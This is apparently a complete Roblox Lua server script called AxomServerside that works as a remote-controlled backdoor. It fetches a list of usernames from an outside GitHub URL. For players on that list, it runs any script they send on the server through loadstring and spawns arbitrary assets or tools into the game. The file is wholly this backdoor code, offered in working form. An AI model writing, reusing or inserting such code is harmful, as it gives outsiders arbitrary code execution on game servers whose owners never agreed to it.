local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local AxomServerside = {}
AxomServerside.Config = {
    WhitelistURL = "https://raw.githubusercontent.com/adamowaissi22-boop/Axom/main/whitelist.json",
    CacheTime = 60
}

local Remotes = {
    CheckWhitelist = Instance.new("RemoteEvent"),
    RequestInterface = Instance.new("RemoteEvent"),
    ExecuteScript = Instance.new("RemoteEvent"),
    SpawnAsset = Instance.new("RemoteEvent"),
    InsertTool = Instance.new("RemoteEvent")
}

local AxomFolder = Instance.new("Folder")
AxomFolder.Name = "AxomServerside"
AxomFolder.Parent = ReplicatedStorage

for name, remote in pairs(Remotes) do
    remote.Name = name
    remote.Parent = AxomFolder
end

local whitelistCache = {}
local lastFetchTime = 0

function AxomServerside.fetchWhitelist()
    local currentTime = os.time()
    
    if currentTime - lastFetchTime < AxomServerside.Config.CacheTime and #whitelistCache > 0 then
        return whitelistCache
    end
    
    local success, response = pcall(function()
        return HttpService:GetAsync(AxomServerside.Config.WhitelistURL)
    end)
    
    if success and response then
        local decoded = HttpService:JSONDecode(response)
        if decoded and decoded.usernames then
            whitelistCache = decoded.usernames
            lastFetchTime = currentTime
            return whitelistCache
        end
    end
    
    return whitelistCache
end

function AxomServerside.isWhitelisted(player)
    local whitelist = AxomServerside.fetchWhitelist()
    local playerName = player.Name
    
    for _, username in ipairs(whitelist) do
        if username == playerName then
            return true
        end
    end
    return false
end

Remotes.CheckWhitelist.OnServerEvent:Connect(function(player)
    Remotes.CheckWhitelist:FireClient(player, AxomServerside.isWhitelisted(player))
end)

Remotes.RequestInterface.OnServerEvent:Connect(function(player)
    if AxomServerside.isWhitelisted(player) then
        Remotes.RequestInterface:FireClient(player, true)
    else
        Remotes.RequestInterface:FireClient(player, false)
    end
end)

Remotes.ExecuteScript.OnServerEvent:Connect(function(player, scriptContent)
    if not AxomServerside.isWhitelisted(player) then return end
    
    local success, err = pcall(function()
        loadstring(scriptContent)()
    end)
    if not success then
        warn("Script execution error from " .. player.Name .. ":", err)
    end
end)

local function safeGetObjects(assetId)
    local success, result = pcall(function()
        return game:GetObjects("rbxassetid://" .. assetId)
    end)
    return success, result
end

Remotes.SpawnAsset.OnServerEvent:Connect(function(player, assetId, spawnType)
    if not AxomServerside.isWhitelisted(player) then return end
    
    local success, objects = safeGetObjects(assetId)
    if not success or #objects == 0 then return end
    
    local model = objects[1]:Clone()
    
    if spawnType == "tool" then
        if player.Character then
            local backpack = player:FindFirstChild("Backpack")
            if backpack then
                model.Parent = backpack
            end
        end
    else
        local offset = CFrame.new(0, 0, -5)
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            model:PivotTo(player.Character.HumanoidRootPart.CFrame * offset)
        end
        model.Parent = workspace
    end
end)

Remotes.InsertTool.OnServerEvent:Connect(function(player, assetId)
    if not AxomServerside.isWhitelisted(player) then return end
    
    local success, objects = safeGetObjects(assetId)
    if not success or #objects == 0 then return end
    
    local tool = objects[1]:Clone()
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        tool.Parent = backpack
    end
end)

Players.PlayerAdded:Connect(function(player)
    task.wait(1)
    Remotes.CheckWhitelist:FireClient(player, AxomServerside.isWhitelisted(player))
end)

for _, player in ipairs(Players:GetPlayers()) do
    Remotes.CheckWhitelist:FireClient(player, AxomServerside.isWhitelisted(player))
end
